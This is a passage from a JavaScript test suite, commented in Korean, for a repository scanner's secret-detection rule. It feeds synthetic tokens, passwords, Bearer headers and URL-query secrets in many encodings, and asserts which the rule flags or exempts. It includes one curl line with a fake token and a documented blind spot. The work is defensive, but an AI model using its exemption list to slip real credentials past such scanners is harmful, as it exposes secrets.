test('C7-SECRET 201 MED-2: 같은 JSON 객체의 직렬화 변형(한 줄·키 뒤 줄바꿈·\\u 이스케이프 키·값 속 \\") → 모두 FAIL', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const name = j('client', '_secret');
  const QV = j('Ab3dEf9h\\"', '12Kx7Yz34QwErTy'); // 원문 표기(값 속 \")
  const variants = {
    compact: j('{"', name, '":"', RND, '"}\n'),
    multiline: j('{"', name, '":\n"', RND, '"}\n'),
    escapedKey: j('{"client_\\u0073', 'ecret":"', RND, '"}\n'),
    escapedQuote: j('{"token":"', QV, '"}\n'),
    pretty: `${JSON.stringify({ [name]: RND }, null, 2)}\n`,
    nestedArray: j('{"oauth":{"', name, '":[\n  "', RND, '"\n]}}\n'),
  };
  // 픽스처 자체: 앞 세 변형은 JSON.parse 결과가 같은 객체다.
  for (const k of ['multiline', 'escapedKey', 'pretty']) assert.deepEqual(JSON.parse(variants[k]), JSON.parse(variants.compact), k);
  for (const [k, text] of Object.entries(variants)) {
    const hits = jsonC7Hits(text);
    assert.ok(hits.some((h) => h.severity === 'FAIL'), `${k}: ${JSON.stringify(hits)}`);
  }
  const files = Object.fromEntries(Object.keys(variants).map((k) => [`docs/design/${k}.json`, variants[k]]));
  const res = scan(await makeRoot({ source: (s) => Object.assign(s, files) }));
  for (const f of Object.keys(files)) assert.ok(c7Of(res, f, 'FAIL'), `${f}: ${JSON.stringify(c7All(res, f))}`);
  // 한 줄 표기는 원문 줄 검사와 디코딩 검사가 같은 줄 — FAIL 1건만(중복 없음).
  // 220(C7-1): 이스케이프 키도 파서가 남긴 원문 오프셋으로 줄을 안다(예전: 원문 재검색 실패 → 줄 null).
  assert.equal(c7All(res, 'docs/design/compact.json').length, 1, JSON.stringify(c7All(res, 'docs/design/compact.json')));
  const esc = c7All(res, 'docs/design/escapedKey.json');
  assert.ok(esc.some((x) => x.line === 1 && x.message.includes(name)), JSON.stringify(esc));
  assert.ok(c7All(res, 'docs/design/multiline.json').every((x) => x.line === 1), JSON.stringify(c7All(res, 'docs/design/multiline.json')));
  // 값 속 \" 로 잘려 WARN 이던 것이 FAIL 로 — 같은 줄의 WARN 과 함께 FAIL 이 있다.
  assert.ok(c7Of(res, 'docs/design/escapedQuote.json', 'FAIL'));
});

test('C7-SECRET 204 (QA203 LOW-1): JSON 중복 키 — 앞값·뒤값·중첩·이스케이프 키 중복 모두 FAIL', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const cases = {
    first: j('{"token":\n"', RND, '",\n"token":"x"}'),
    last: j('{"token":"x",\n"token":\n"', RND, '"}'),
    nested: j('{"a":{"secret":"', RND, '","secret":""}}'),
    escaped: j('{"\\u0074oken":\n"', RND, '",\n"token":"x"}'),
  };
  // 픽스처 자체: JSON.parse 로는 실값이 사라진다(first·nested·escaped).
  for (const k of ['first', 'nested', 'escaped']) assert.ok(!JSON.stringify(JSON.parse(cases[k])).includes(RND), k);
  for (const [k, text] of Object.entries(cases)) {
    const hits = jsonC7Hits(text);
    assert.ok(hits.some((h) => h.severity === 'FAIL'), `${k}: ${JSON.stringify(hits)}`);
  }
  assert.equal(jsonC7Hits(cases.first).find((h) => h.severity === 'FAIL').line, 1);
  // 디코딩/이스케이프 파서 일치: 일반 문서는 JSON.parse 와 같은 문자열을 본다.
  // 204 재시도(QA205 MED-1): 깊은 패딩 배열 뒤에서도 디코딩 검사가 사라지지 않는다(null·크래시 아님, 이스케이프 키 실값 → FAIL).
  for (const d of [10000, 100000]) {
    const deep = j('{"\\u0074oken":"', RND, '","pad":', '['.repeat(d), ']'.repeat(d), '}');
    const hits = jsonC7Hits(deep);
    assert.ok(hits !== null && hits.some((h) => h.severity === 'FAIL'), `depth ${d}: ${JSON.stringify(hits)}`);
  }
  assert.deepEqual(jsonC7Hits(j('{"a":"x\\u0041\\/\\"\\\\y","n":[1,-2.5e3,true,false,null,{}],"e":[]}')), []);
});

// ── C7 시크릿 — 206(QA203 INFO-3 이름 끝 제외 + hex 실값, INFO-2 묶음 이름 부모·Bearer) ──
const HEXL = j('abcdef0123', '456789abcdef'); // 합성 소문자 hex(22자)
const HEXU = j('ABCDEF0123', '456789ABCD'); // 합성 대문자 hex(20자)

test('C7-SECRET 206 INFO-3: 메타데이터 이름 끝(_min·_max·_cost·_policy…)이어도 값이 긴 hex 면 FAIL — 원문 줄·JSON 디코딩·스캐너', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const pos = [
    j('client_secret', '_min=', HEXL),
    j('client_secret', '_max=', HEXU),
    j('password', '_cost: ', HEXL),
    j('token', '_policy: ', HEXU),
    j('token', '_audience=', HEXL),
  ];
  for (const l of pos) assert.deepEqual(await kvSev(l), ['FAIL'], l);
  const jsonPos = {
    compact: j('{"client_secret', '_min":"', HEXL, '"}\n'),
    multiline: j('{"client_secret', '_max":\n"', HEXU, '"}\n'),
    nested: j('{"auth":{"token', '_policy":["', HEXL, '"]}}\n'),
  };
  for (const [k, t] of Object.entries(jsonPos)) assert.ok(jsonC7Hits(t).some((h) => h.severity === 'FAIL'), `${k}: ${JSON.stringify(jsonC7Hits(t))}`);
  const res = scan(await makeRoot({ source: (s) => {
    s['docs/ops/hex.md'] = `${pos.join('\n')}\n`;
    s['docs/design/hex-multi.json'] = jsonPos.multiline;
  } }));
  assert.equal(c7All(res, 'docs/ops/hex.md').filter((x) => x.severity === 'FAIL').length, pos.length, JSON.stringify(c7All(res, 'docs/ops/hex.md')));
  assert.ok(c7Of(res, 'docs/design/hex-multi.json', 'FAIL'));
});

test('C7-SECRET 206 INFO-3 음성: hex 가 자연스러운 이름 끝(_hash·_id)·uuid·색 코드·짧은 hex·sha512 integrity·커밋 해시 문구 → 0', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const neg = [
    j('token', '_hash: 3f2a9c1b7e8d4a6f'), // 201 음성 그대로
    j('token', '_hash=', HEXL),
    j('signing_key', '_id: ', HEXU),
    j('secret', '_id=', HEXL),
    j('secret', '_min: 550e8400-e29b-41d4-a716-446655440000'), // uuid(하이픈)
    j('token', '_max=#ff00aa'), // 색 코드
    j('token', '_color_max: ff00aa77'),
    j('password', '_min: abcdef0123'), // 10자 hex — 무작위형 아님·16자 미만
    j('password', '_max: 0123456789012345678'), // 숫자만
    j('token', '_policy: deadbeefcafe-v2'), // hex 아닌 글자(-·v)
    j('token', '_policy 커밋 3f2a9c1b7e8d4a6f0011aa (fix)'), // 이름=값 아님
  ];
  for (const l of neg) assert.deepEqual(await kvSev(l), [], l);
  const lock = {
    lockfileVersion: 3,
    packages: {
      'node_modules/js-tokens': { version: '4.0.0', resolved: j(HTTPS, 'registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz'), integrity: j('sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN9k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW', '/PKQ==') },
      'node_modules/design-tokens': { version: '1.0.0', integrity: j('sha1-', HEXL, '0011aabb') },
    },
    dependencies: { 'js-tokens': { version: '4.0.0', integrity: j('sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN9k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW', '/PKQ==') } },
    meta: { token_hash: HEXL, signing_key_id: HEXU, secret_min: '550e8400-e29b-41d4-a716-446655440000', commit: j('3f2a9c1b7e8d', '4a6f0011aabbccddeeff00112233') },
  };
  assert.deepEqual(jsonC7Hits(JSON.stringify(lock, null, 2)), []);
});

test('C7-SECRET 206 INFO-2: 조상 키가 비밀 묶음 이름(credentials·secrets·apiKeys·api_keys·oauthTokens…)이면 자식 값도 FAIL — 깊이 무관', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const cases = {
    credentials: j('{"credentials":{"github":"', RND, '"}}\n'),
    secrets: j('{"secrets":{\n"deploy":\n"', RND, '"}}\n'),
    apiKeys: j('{"svc":{"apiKeys":[{"naver":"', RND, '"}]}}\n'),
    API_KEYS: j('{"API_KEYS":{"a":"', RND, '"}}\n'),
    passwords: j('{"db_passwords":{"main":"', RND, '"}}\n'),
    deep: j('{"credentials":{"a":{"b":[[{"c":{"d":"', RND, '"}}]]}}}\n'),
    tokensRandom: j('{"oauthTokens":{"gh":"', RND, '"}}\n'),
    tokensHex: j('{"tokens":{"gh":"', HEXL, '"}}\n'),
    tokenInTokensUnderCreds: j('{"credentials":{"tokens":{"x":"', HEXL, '"}}}\n'),
    // 209(QA207 LOW-1) — 여러 마디 snake·dot 앞부분
    snakeMulti: j('{"aws_prod_credentials":{"k":"', RND, '"}}\n'),
    SNAKE_MULTI: j('{"AWS_PROD_CREDENTIALS":{"k":"', RND, '"}}\n'),
    dotMulti: j('{"a.b.secrets":{"k":"', RND, '"}}\n'),
    dotApiKeys: j('{"my_app.api_keys":{"k":"', RND, '"}}\n'),
  };
  for (const [k, t] of Object.entries(cases)) assert.ok(jsonC7Hits(t).some((h) => h.severity === 'FAIL'), `${k}: ${JSON.stringify(jsonC7Hits(t))}`);
  // 묶음 아래 짧은 값은 WARN(이름=값 규칙과 같은 등급), 자식 키가 비밀 이름이면 그 판정 하나만(중복 없음).
  assert.deepEqual(jsonC7Hits(j('{"credentials":{"user":"admin', '1234"}}')).map((h) => h.severity), ['WARN']);
  assert.equal(jsonC7Hits(j('{"credentials":{"client', '_secret":"', RND, '"}}')).length, 1);
  // 깊은 중첩(비재귀 순회) 뒤에서도 상속이 유지된다.
  const d = 50000;
  const deep = j('{"credentials":', '['.repeat(d), '"', RND, '"', ']'.repeat(d), '}');
  assert.ok(jsonC7Hits(deep).some((h) => h.severity === 'FAIL'));
  const res = scan(await makeRoot({ source: (s) => { s['docs/design/creds.json'] = cases.secrets; } }));
  assert.ok(c7Of(res, 'docs/design/creds.json', 'FAIL'), JSON.stringify(c7All(res, 'docs/design/creds.json')));
});

test('C7-SECRET 206 INFO-2 음성: 디자인 토큰(tokens 부모)·실트리 docs/design/tokens.json·package-lock 키(js-tokens)·제외 자식 키 → 0', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const design = {
    color: { tokens: [{ name: 'bg-000', value: '#ffffff', usage: 'Page ground. 13.6:1 on white.' }, { name: 'shadow-2', value: 'rgba(0,0,0,0.12)', usage: '0 1px 2px' }] },
    type: { tokens: [{ name: 'font-body', value: 'Pretendard Variable', size: '15px/1.6' }, { name: 'motion-200ms', value: 'cubic-bezier(0.2,0,0,1)' }] },
    boundedTokens: ['ai', 'gpt4o-mini-2024'],
  };
  assert.deepEqual(jsonC7Hits(JSON.stringify(design, null, 2)), []);
  const real = readFileSync(resolve(HERE, '..', '..', 'docs', 'design', 'tokens.json'), 'utf8');
  assert.match(real, /"tokens"\s*:/); // 실트리 파일이 실제로 tokens 부모를 가진다(음성 대상 고정)
  assert.deepEqual(jsonC7Hits(real), []);
  // 서비스 계정형 묶음: 경로·URL·_id 이름 끝 자식은 제외(가장 가까운 키로 판정).
  const sa = { credentials: { client_id: HEXL, token_uri: j(HTTPS, 'oauth2.googleapis.com/token'), key_path: '/run/secrets/sa_key_2', api: '${API_KEY}', note: '<CLIENT_SECRET>' } };
  assert.deepEqual(jsonC7Hits(JSON.stringify(sa, null, 2)), []);
  // 묶음 이름 경계: 앞부분 '-'(npm 이름)·뒤 글자 붙음·'/' 키는 묶음 아님.
  for (const k of ['js-tokens', 'node_modules/js-tokens', 'secretsManager', 'credentialsFile2', 'tokensCount']) {
    assert.deepEqual(jsonC7Hits(JSON.stringify({ [k]: { integrity: j('sha512-', RND) } })), [], k);
  }
});

test('C7-SECRET 206 INFO-2: Bearer <토큰>(Authorization 값) — 원문 줄(코드·비코드)·JSON 디코딩 FAIL, 템플릿·자리·산문 0', async () => {
  const { c7LineHits, jsonC7Hits } = await import('../lib/rules-source.mjs');
  const B = j('Bear', 'er ');
  const pos = [j('Authorization: ', B, RND), j('curl -H "Authorization: bear', 'er ', HEXL, '"'), j("headers: { Authorization: '", B, RND, "' }")];
  for (const l of pos) {
    assert.deepEqual(await kvSev(l), ['FAIL'], l);
    assert.ok(c7LineHits(l, true).some((h) => h.severity === 'FAIL'), `code: ${l}`);
  }
  const json = { headers: { Authorization: j(B, RND) } };
  assert.ok(jsonC7Hits(JSON.stringify(json, null, 2)).some((h) => h.severity === 'FAIL'));
  const neg = [j(B, '${accessToken}'), j('`', B, '${t}`'), j(B, '<token>'), j(B, '__SET_ME__'), j('a bear', 'er tokens are issued by the auth server'), j(B, 'your-token-1234567890'), j(B, 'abcdefghijklmnopqrst')];
  neg.push(j(B, '/api/v1/users/profile'), j('GET ', B, '/api/v1/users/profile2 HTTP/1.1'));
  for (const l of neg) {
    assert.deepEqual(await kvSev(l), [], l);
    assert.deepEqual(c7LineHits(l, true), [], `code: ${l}`);
  }
  // 한 줄 Bearer 는 원문 줄·디코딩 줄이 같아 스캐너 FAIL 1건(중복 없음).
  const res = scan(await makeRoot({ source: (s) => { s['docs/design/hdr.json'] = `${JSON.stringify(json)}\n`; s['docs/ops/hdr.md'] = `${pos[0]}\n`; } }));
  assert.equal(c7All(res, 'docs/design/hdr.json').length, 1, JSON.stringify(c7All(res, 'docs/design/hdr.json')));
  assert.ok(c7Of(res, 'docs/ops/hdr.md', 'FAIL'));
});

// ── C7-SECRET 212 — 대문자 env 규칙에도 이름 끝(_FILE·_PATH·_URL…) + 경로·URL 값 제외 ──
test('C7-SECRET 212: 대문자 env KEY=값 — 이름 끝 _FILE·_URL·_PATH + 경로·자격 증명 없는 URL 값은 제외, 무작위 실값·user:pass@·hex 는 FAIL(코드·비코드)', async () => {
  const { c7LineHits } = await import('../lib/rules-source.mjs');
  const neg = [
    j('POSTGRES_PASSWORD', '_FILE=/run/secrets/db_password'),
    j('TOKEN', '_URL=', HTTPS, 'nid.naver.com/oauth2.0/token'),
    j('JWT_SECRET', '_PATH=./secrets/jwt.pem'),
    j('export DB_PASSWORD', '_FILE="/run/secrets/db_password"'),
    j('- API_TOKEN', '_URL=', HTTPS, 'openapi.example.org/v1/token'),
  ];
  for (const l of neg) {
    assert.deepEqual(c7LineHits(l, true), [], `code: ${l}`);
    assert.deepEqual(c7LineHits(l, false), [], `noncode: ${l}`);
  }
  const pos = [
    j('DB_PASSWORD', '=', RND),
    j('X_TOKEN', '_URL=', HTTPS, 'u:p@host.example.org/x'),
    j('X_TOKEN', '_URL=', HTTPS, RND, '@host.example.org/x'),
    j('SECRET', '_FILE=', RND),
    j('API_SECRET', '_FILE="', RND, '"'),
    j('JWT_SECRET', '_PATH=', HEXL),
    j('SECRET', '_FILE=/run/', RND),
    j('SECRET', '_FILE=', HEXU, 'EF'),
    j('X_TOKEN', '_URL=', HTTPS, 'h.example.org/cb?access', '_token=', HEXL), // 213 F1: URL 질의 속 비밀 kv
    j('X_TOKEN', '_URL=', HTTPS, 'h.example.org/cb#secret', '=', HEXL),
    j('X_SECRET', '_FILE=hunter2hunter2hunter2x'), // 213 F3(a): 이름 끝 + 경로·URL·무작위·hex 아닌 일반 실값
    j('X_TOKEN', '_URL=', HTTPS, 'h.example.org/', RND), // 213 F3(b): 평문 URL + 무작위 마디
    j('DB_PASSWORD', '=/run/secrets/db_password'), // 213 F3(c): 이름 끝 없음 + 경로 값
  ];
  for (const l of pos) {
    assert.ok(c7LineHits(l, true).some((h) => h.severity === 'FAIL'), `code: ${l}`);
    assert.ok(c7LineHits(l, false).some((h) => h.severity === 'FAIL'), `noncode: ${l}`);
  }
});

test('C7-SECRET 213 F3: 대문자 이름 YAML 맵·Dockerfile ENV/ARG 형태도 같은 제외 — 경로·평문 URL 0, user:pw@·무작위 값 FAIL(비코드)', async () => {
  const { c7LineHits } = await import('../lib/rules-source.mjs');
  const neg = [
    j('  POSTGRES_PASSWORD', '_FILE: /run/secrets/db_password'),
    j('ENV X_SECRET', '_FILE /run/secrets/x_password'),
    j('ARG X_SECRET', '_FILE=/run/secrets/x_password'),
    j('  X_TOKEN', '_URL: "', HTTPS, 'nid.naver.com/oauth2.0/token"'),
  ];
  for (const l of neg) assert.deepEqual(c7LineHits(l, false), [], l);
  const pos = [
    j('  X_TOKEN', '_URL: "', HTTPS, 'u:pw1@h/x"'),
    j('ENV X_SECRET', '_FILE ', RND),
    j('  X_SECRET', '_FILE: ', RND),
    j('  X_TOKEN', '_URL: ', HTTPS, 'h.example.org/cb?access', '_token=', HEXL),
  ];
  for (const l of pos) assert.ok(c7LineHits(l, false).some((h) => h.severity === 'FAIL'), l);
});

test('C7-SECRET 212 ReDoS: 대문자 env 규칙 10KB 적대 줄 — 줄마다 200ms 안', async () => {
  const { c7LineHits } = await import('../lib/rules-source.mjs');
  const lines = [
    'TOKEN_'.repeat(1700),
    j('TOKEN', '_FILE='.repeat(1700)),
    j('SECRET_FILE=', '/a'.repeat(5000)),
    j('SECRET_URL=', HTTPS, 'a/'.repeat(5000)),
    j('A_PASSWORD_PATH=./', 'x'.repeat(10000)),
    j('A_TOKEN_FILE=/', `${RND}/`.repeat(500)),
  ];
  for (const l of lines) {
    c7LineHits(l, true);
    const t = process.hrtime.bigint();
    c7LineHits(l, true);
    c7LineHits(l, false);
    const ms = Number(process.hrtime.bigint() - t) / 1e6;
    assert.ok(ms < 200, `${l.slice(0, 16)}… ${l.length}자: ${ms.toFixed(1)}ms`);
  }
});

test('C7-SECRET 201 MED-2: JSON 디코딩 단계 음성 — 제외 규칙 그대로·integrity 해시·평범한 키, JSONC(주석) 파일도 디코딩 검사(220)', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const clean = {
    lockfileVersion: 3,
    packages: {
      'node_modules/js-tokens': { version: '4.0.0', resolved: j(HTTPS, 'registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz'), integrity: j('sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN9k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW', '/PKQ==') },
      'node_modules/@tokenizer/token': { version: '0.3.0' },
    },
    oauth: { token_url: j(HTTPS, 'nid.naver.com/oauth2.0/token'), token_audience: 'withsmall-api-v1', secret_path: '/run/secrets/deploy_key_2', client_secret: '<CLIENT_SECRET>', api_key: '${API_KEY}' },
    color: { token: 'primary', tokens: 'brand-500' },
  };
  assert.deepEqual(jsonC7Hits(JSON.stringify(clean, null, 2)), []);
  // 220(Codex night-qa2 C7-2): JSONC(주석·마지막 쉼표)는 걷어 내고 디코딩 검사 — 깨끗하면 [](예전: null 로 디코딩 검사 생략).
  assert.deepEqual(jsonC7Hits('{ // 주석\n "a": 1 }'), []);
  // JSONC 파일: 한 줄 표기는 원문 검사로, 줄바꿈 표기도 이제 디코딩 검사로 FAIL(키 줄 2).
  const res = scan(await makeRoot({ source: (s) => {
    s['docs/design/jsonc-a.json'] = j('// c\n{"', 'client_secret":"', RND, '"}\n');
    s['docs/design/jsonc-b.json'] = j('// c\n{"', 'client_secret":\n"', RND, '"}\n');
  } }));
  assert.ok(c7Of(res, 'docs/design/jsonc-a.json', 'FAIL'));
  const b = c7All(res, 'docs/design/jsonc-b.json');
  assert.ok(b.some((x) => x.severity === 'FAIL' && x.line === 2), JSON.stringify(b));
});

// ── C7 시크릿 — 220(Codex night-qa2 C7 MED 1~6) ──────────────────────────────
const QA2_RND = j('Qa7bCd8eFg9h', 'Jk2mNp4r'); // Codex 재현 입력의 합성 무작위형 값(20자)
const QA2_HUNTER = j('hunter2', 'hunter2', 'hunter2'); // 합성 실값(21자, 경로·URL 아님)

test('C7-SECRET 220 C7-1: 이스케이프 키 1만6천 개 — 키 원문 재검색 없이 선형(1초 안), 이스케이프 키 줄 번호 정확', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const doc = (n) => `{${Array(n).fill('"\\u0061":0').join(',')}}`;
  jsonC7Hits(doc(2000)); // 데우기
  const t = process.hrtime.bigint();
  assert.deepEqual(jsonC7Hits(doc(16000)), []);
  const ms = Number(process.hrtime.bigint() - t) / 1e6;
  assert.ok(ms < 1000, `16000 키: ${ms.toFixed(1)}ms(HEAD e21fa8f 약 1만 ms)`);
  // 셋째 줄의 이스케이프 키 → 줄 3, 중복 키 앞값도 제 줄.
  const hits = jsonC7Hits(j('{\n"a":1,\n"\\u0074oken":\n"', RND, '",\n"\\u0074oken":"x"}'));
  assert.ok(hits.some((h) => h.severity === 'FAIL' && h.line === 3), JSON.stringify(hits));
  // BOM 이 있어도 줄 번호는 원문 그대로.
  const bom = jsonC7Hits(j('\uFEFF{\n\n"tok', 'en":"', RND, '"}'));
  assert.ok(bom.some((h) => h.severity === 'FAIL' && h.line === 3), JSON.stringify(bom));
});

test('C7-SECRET 220 C7-2: JSON 문법 오류 — JSONC(주석·마지막 쉼표) 재시도 후 검사, 그래도 실패면 FAIL "JSON 디코딩 검사 불가 — 문법 오류"', async () => {
  const { jsonC7Hits, stripJsonc } = await import('../lib/rules-source.mjs');
  const fails = (text) => jsonC7Hits(text).filter((h) => h.severity === 'FAIL');
  // Codex 재현 입력 그대로(마지막 쉼표) → 디코딩 검사가 돈다(문법 오류 FAIL 이 아니라 시크릿 FAIL).
  const codex = j('{"\\u0074oken":"', QA2_RND, '",}');
  assert.ok(fails(codex).some((h) => h.message.includes('디코딩 값')), JSON.stringify(jsonC7Hits(codex)));
  // 변형: 블록 주석 + 배열 마지막 쉼표 + 문자열 속 // 와 /* 는 보존.
  const jsonc = j('{\n  /* 설정 */ "u": "http://h.test//a/*b*/",\n  "list": [1, 2,],\n  "nested": { "pass', 'word": "', QA2_RND, '", } // 끝\n}\n');
  const hits = fails(jsonc);
  assert.ok(hits.some((h) => h.line === 4 && h.message.includes('디코딩 값')), JSON.stringify(hits));
  assert.equal(stripJsonc(jsonc).length, jsonc.length);
  assert.equal(JSON.parse(stripJsonc(jsonc)).u, 'http://h.test//a/*b*/');
  // 깨끗한 tsconfig 형태 JSONC → [].
  assert.deepEqual(jsonC7Hits('{\n  // c\n  "compilerOptions": { "strict": true, /* x */ "paths": { "@/*": ["src/*"], }, },\n}\n'), []);
  // 고칠 수 없는 문법 오류 → FAIL(줄 null), 메시지 고정 머리.
  for (const bad of ['{"a":', j('{"tok', 'en":"', QA2_RND, '" "b":1}'), '{"a":1} x', '{"a": /* 닫히지 않은 주석 1}']) {
    const h = jsonC7Hits(bad);
    assert.equal(h.length, 1, bad);
    assert.equal(h[0].severity, 'FAIL');
    assert.equal(h[0].line, null);
    assert.ok(h[0].message.startsWith('JSON 디코딩 검사 불가 — 문법 오류'), h[0].message);
  }
  // 스캔: 문법 오류 .json → C7 FAIL, JSONC 깨끗한 파일 → 0.
  const res = scan(await makeRoot({ source: (s) => {
    s['docs/design/broken.json'] = '{"a": 1,, }\n';
    s['docs/design/tsconfig.like.json'] = '{\n  // c\n  "compilerOptions": { "strict": true, },\n}\n';
  } }));
  assert.ok(c7All(res, 'docs/design/broken.json').some((x) => x.severity === 'FAIL' && x.message.startsWith('JSON 디코딩 검사 불가 — 문법 오류')));
  assert.deepEqual(c7All(res, 'docs/design/tsconfig.like.json'), []);
});

test('C7-SECRET 220 C7-3: 경로·주소 이름 끝(_FILE·_PATH·_DIR·_URL·_URI·_ENDPOINT·_HOST)은 값 형태가 맞을 때만 제외 — 네 경로 공통', async () => {
  const { c7LineHits, jsonC7Hits, secretKvHits, secretKvHitsSimple } = await import('../lib/rules-source.mjs');
  const jsonFail = (t) => jsonC7Hits(t).some((h) => h.severity === 'FAIL');
  // Codex 재현 입력 그대로 — 원문·디코딩 모두 FAIL.
  const codex = j('{"client_secret', '_FILE":"', QA2_HUNTER, '"}');
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  assert.ok(jsonFail(codex));
  // 변형: 소문자 kv · JSON 다른 끝 · 대문자 env(코드 파일 경로) · NONCODE YAML.
  for (const name of ['client_secret_path', 'token_dir', 'client_secret_url', 'token_endpoint', 'secret_uri', 'token_host']) {
    assert.deepEqual(await kvSev(j(name, '=', QA2_HUNTER)), ['FAIL'], name);
    assert.ok(jsonFail(j('{"', name, '":"', QA2_HUNTER, '"}')), name);
    assert.deepEqual(secretKvHits(j(name, '=', QA2_HUNTER)), secretKvHitsSimple(j(name, '=', QA2_HUNTER)), name);
  }
  assert.ok(c7LineHits(j('CLIENT_SECRET', '_DIR=', QA2_HUNTER), true).length > 0);
  assert.ok(c7LineHits(j('  CLIENT_SECRET', '_FILE: ', QA2_HUNTER), false).length > 0);
  // 대문자 env(엄격): 경로 끝은 경로 값만 — URL 값이면 제외 안 함 / 주소 끝은 URL 값만 — 경로 값이면 제외 안 함.
  assert.ok(c7LineHits(j('SECRET', '_FILE=', HTTPS, 'h.test/run/secrets/a'), true).length > 0);
  assert.ok(c7LineHits(j('TOKEN', '_URL=/run/secrets/token_url_v2'), true).length > 0);
  // 음성: 값 형태가 맞으면 계속 제외.
  const neg = [
    j('client_secret', '_FILE=/run/secrets/client_secret'),
    j('POSTGRES_PASS', 'WORD_FILE=/run/secrets/postgres_password'),
    j('TOKEN', '_HOST=', HTTPS, 'auth.withsmall.kr'),
    j('token', '_dir: ./var/lib/withsmall/tokens'),
    j('{"secret', '_path":"/run/secrets/deploy_key_2","token_uri":"', HTTPS, 'oauth2.googleapis.com/token"}'),
  ];
  for (const l of neg) {
    assert.deepEqual(c7LineHits(l, false), [], l);
    assert.deepEqual(c7LineHits(l, true), [], l);
  }
  assert.deepEqual(jsonC7Hits(neg[4]), []);
  // 메타데이터 끝은 현재 동작 유지(값 형태 무관 제외 — 남은 사각지대), 긴 hex·무작위형 예외는 그대로.
  assert.deepEqual(await kvSev(j('client_secret', '_min=', QA2_HUNTER)), []);
  assert.deepEqual(await kvSev(j('client_secret', '_min=', QA2_RND)), ['FAIL']);
  assert.deepEqual(await kvSev(j('client_secret', '_min=', HEX64)), ['FAIL']);
});

test('C7-SECRET 220 C7-4: URL 값의 무작위 마디 — URL 이라는 이유만으로 제외하지 않음(kv·JSON·이름 무관)', async () => {
  const { jsonC7Hits, secretKvHits, secretKvHitsSimple } = await import('../lib/rules-source.mjs');
  const jsonFail = (t) => jsonC7Hits(t).some((h) => h.severity === 'FAIL');
  const codex = j('{"TOKEN', '_URL":"', HTTPS, 'h.test/', QA2_RND, '"}');
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  assert.ok(jsonFail(codex));
  const pos = [j('token', '_url: ', HTTPS, 'h.test/', RND, '/cb'), j('tok', 'en=', HTTPS, 'h.test/v1/', QA2_RND)];
  for (const l of pos) {
    assert.deepEqual(await kvSev(l), ['FAIL'], l);
    assert.deepEqual(secretKvHits(l), secretKvHitsSimple(l), l);
  }
  assert.ok(jsonFail(j('{"tok', 'en":"', HTTPS, 'h.test/', QA2_RND, '"}')));
  assert.ok(jsonFail(j('{"credentials":{"github":"', HTTPS, 'h.test/', QA2_RND, '"}}')));
  // 음성: 평문 URL(무작위 마디 없음)은 계속 제외.
  for (const l of [j('token', '_url=', HTTPS, 'nid.naver.com/oauth2.0/token'), j('tok', 'en_uri: ', HTTPS, 'oauth2.googleapis.com/token')]) assert.deepEqual(await kvSev(l), [], l);
  assert.deepEqual(jsonC7Hits(j('{"token', '_url":"', HTTPS, 'nid.naver.com/oauth2.0/token"}')), []);
});

test('C7-SECRET 220 C7-5: Bearer /<긴 hex·무작위형 한 마디> → FAIL, 여러 마디 경로는 계속 제외', async () => {
  const { jsonC7Hits } = await import('../lib/rules-source.mjs');
  const codex = j('{"Authorization":"Bea', 'rer /ab12cd34ef56ab78cd90ef12"}');
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  assert.ok(jsonC7Hits(codex).some((h) => h.severity === 'FAIL'), JSON.stringify(jsonC7Hits(codex)));
  for (const l of [j('Authorization: Bea', 'rer /AB12CD34EF56AB78CD90'), j('auth: bea', 'rer ./0123456789abcdef0'), j('Authorization: Bea', 'rer /', QA2_RND)]) {
    assert.ok((await kvSev(l)).includes('FAIL'), l);
  }
  // 230(Codex night-qa3 C7-3): Bearer 문맥은 토큰 형태 마디(16자+ 글자·숫자)가 있으면 경로여도 토큰 — 예전 음성 '/static/<hex 18자>/app.js' 는 이제 FAIL(아래 230 테스트).
  for (const l of [j('Authorization: Bea', 'rer /api/v1/users/profile'), j('Bea', 'rer /healthcheck-ready')]) {
    assert.deepEqual(await kvSev(l), [], l);
  }
});

test('C7-SECRET 220 C7-6: URL 질의 퍼센트 인코딩 키·값 → 한 번 디코딩 후 검사(중복 없음)', async () => {
  const { c7LineHits, jsonC7Hits, urlQueryKvHits } = await import('../lib/rules-source.mjs');
  const codex = j('url=', HTTPS, 'h.test/?access%5F', 'token=', QA2_RND);
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  const pos = [
    j('cb: ', HTTPS, 'h.test/cb?x=1&ACCESS%5f', 'TOKEN=', QA2_RND),
    j('see ', HTTPS, 'h.test/cb#access_', 'token=%51', 'a7bCd8eFg9hJk2mNp4r&x=1'),
    j('"', HTTPS, 'h.test/?client%5Fsecret=', QA2_RND, '"'),
  ];
  for (const l of pos) assert.deepEqual(await kvSev(l), ['FAIL'], l);
  assert.ok(jsonC7Hits(j('{"cb":"', HTTPS, 'h.test/?access%5f', 'token=', QA2_RND, '"}')).some((h) => h.severity === 'FAIL'));
  // 대문자 env 의 URL 이름 끝 제외도 디코딩한 질의 kv 를 본다.
  assert.ok(c7LineHits(j('TOKEN', '_URL=', HTTPS, 'h.test/cb?access%5F', 'token=', HEX64), true).length > 0);
  // 음성·중복: 값만 인코딩된 원문 쌍은 원문 검사 1건만 · 한글·리다이렉트 URL·자리표시·깨진 인코딩은 0.
